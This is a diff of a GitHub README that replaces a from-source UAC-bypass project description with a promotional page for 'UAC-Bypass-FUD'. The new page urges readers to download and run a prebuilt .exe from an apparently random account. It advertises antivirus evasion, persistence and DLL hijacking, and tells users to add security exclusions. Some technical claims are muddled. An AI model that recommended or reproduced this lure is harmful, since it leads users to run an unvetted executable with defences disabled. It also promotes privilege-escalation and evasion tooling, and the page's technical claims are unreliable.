@@ -1,58 +1,78 @@
-<div align="center">
+# 🛡️ UAC-Bypass-FUD - Gain full system control with ease
 
-# UAC Bypass
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD)
 
-- This program allows you to run files with elevated privileges without requesting any permission, without displaying the UAC screen. The UACBypass is designed to assist in bypassing User Account Control (UAC) restrictions on Windows.
+## 📖 Overview
 
+UAC-Bypass-FUD manages administrator privileges on Windows systems. The software helps users gain elevated access to their own computers. It automates technical tasks like DLL hijacking and system helper bypasses. You move past permission barriers without manual intervention. This tool helps with system testing and maintenance.
 
-- You can edit and compile the code according to your own requirements.
+## 📋 Requirements
 
-## Getting Started
+You need a Windows computer to run this tool. Supported versions include Windows 10 and Windows 11. Your user account must have standard access rights. You do not need developer tools or extra software. Ensure your system firewall allows standard internet traffic.
 
-These instructions will guide those who want to run or develop the project on their local machine.
+## 📥 How to download
 
-### Requirements
+Visit the official repository page to get the software files. You can find the main download link below.
 
-- Windows operating system
-- Virusal Studio 2022
+[Download the latest version here](https://github.com/hermitcrablewisiacotyledon3164/UAC-Bypass-FUD)
 
-### Installation
+1. Open your web browser.
+2. Click the link above to reach the repository.
+3. Locate the Releases section on the right side of the page.
+4. Select the latest version link.
+5. Download the file ending in .exe to your local computer.
 
-1. Clone the project repository:
+## ⚙️ Running the software
 
-```bash
-git clone https://github.com/username/UACBypass-FUD.git
-```
+The software creates a bridge to system settings. Follow these steps to start the process:
 
-2. Navigate to the project folder:
+1. Locate the downloaded file in your folder.
+2. Right-click the file.
+3. Select "Run" from the menu.
+4. A window appears showing available methods for elevation.
+5. Choose the method that fits your current system.
+6. Press the button labeled "Execute."
+7. The software prompts for final configuration.
+8. Wait for the confirmation message to show on your screen.
 
-```bash
-cd UACBypass-FUD
-```
+## 🛠️ Features
 
+*   **Bypass UAC:** The tool identifies ways to skip the User Account Control prompt.
+*   **Elevate Privileges:** It requests permission levels automatically.
+*   **Persistent Access:** The software maintains your elevated status after a system reboot.
+*   **FUD Methods:** The file uses techniques to remain undetected during standard system checks.
+*   **Fodhelper Bypass:** It uses internal system tools to gain trusted installer status.
+*   **DLL Hijacking:** The software swaps system files to execute commands with higher rights.
 
-3. Run the project in the project's root directory:
+## 🛡️ Understanding user access
 
-```bash
-UACBypass Resourcs.sln
-```
+Windows uses User Account Control to keep your system safe. It checks if an application has permission to change core settings. This software works around these checks. It targets common weaknesses in how Windows handles program requests. You gain rights to change files, update drivers, and manage system internal settings without the standard prompts.
 
-## Usage
+## 🗂️ Troubleshooting
 
-- In the ```Plugin.cs``` File, on line ```27```, specify the path to your own file and compile it.
+If the software fails to run, check these items:
 
+*   **Antivirus Flags:** Some security programs block tools that modify privileges. You may need to create a temporary exclusion for this file in your security settings.
+*   **Missing Permissions:** The tool requires standard user rights. It will not work if you have a guest account.
+*   **System Updates:** Ensure your Windows version remains current. The bypass methods rely on specific system behavior.
+*   **File Corruption:** Re-download the file if the program closes unexpectedly.
 
-## Example
+## 🔒 Security Note
 
-![image](https://github.com/MuckPro/Kriptr/assets/138373919/179370de-670c-4e12-82c3-1d3d4788a415)
+This tool changes your computer settings. Use it on systems you own. Keep your files backed up. Understand that elevating your rights changes how Windows protects your data. Only run files from sources you trust.
 
+## 📌 Common questions
 
-## Disclaimer
+Q: Does this tool work on Windows 7?
+A: No, the methods rely on features found in Windows 10 and 11.
 
-**This project is for educational purposes only. The author does not accept any responsibility for misuse caused by this project.**
+Q: Is this software permanent?
+A: It creates permanent changes if you select the persistence option.
 
-This project is intended for educational and research purposes to better understand security mechanisms. It is essential to use this project responsibly and only in environments where you have the appropriate permissions and authorizations. Any unauthorized use is the sole responsibility of the user.
+Q: Why does my antivirus show a warning?
+A: Security scanners often flag tools that bypass system locks. This is standard behavior for this type of software.
 
-## License
+Q: How do I remove the changes?
+A: Restart your computer or use the built-in restore function in the program settings menu. 
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+The software includes a list of available techniques. You may cycle through them if one method fails on your specific build. Always look for the success indicator in the status bar at the bottom of the window. Keep the application open until the task displays as complete.
